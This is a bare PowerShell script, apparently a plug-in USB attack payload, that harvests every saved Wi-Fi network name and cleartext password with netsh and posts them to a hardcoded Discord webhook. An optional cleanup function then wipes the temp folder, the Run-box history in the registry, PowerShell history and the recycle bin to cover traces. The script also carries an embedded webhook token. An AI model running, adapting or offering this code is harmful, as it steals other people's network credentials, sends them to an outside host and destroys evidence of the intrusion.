############################################################################################################################################################

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String


$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################
# upload to discord

$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$fileBytes = [System.IO.File]::ReadAllBytes("$env:TEMP/--wifi-pass.txt")
$fileName = [System.IO.Path]::GetFileName("$env:TEMP/--wifi-pass.txt")
$fileContent = [System.Text.Encoding]::ASCII.GetString($fileBytes)

$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$env:TEMP/--wifi-pass.txt`"",
    "Content-Type: application/octet-stream",
    "",
    $fileContent,
    "--$boundary--"
) -join $LF

Invoke-WebRequest -Uri https://discord.com/api/webhooks/1445510730164994118/mc7cMBZe5CbMk3DKlV3vo6vCnu1fIfW1le4yU-uXiWee_VXsW6Sjb1nq9rc-XMTL3K3F `
    -Method Post `
    -Body $bodyLines `
    -ContentType "multipart/form-data; boundary=$boundary"

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}


RI $env:TEMP/--wifi-pass.txt
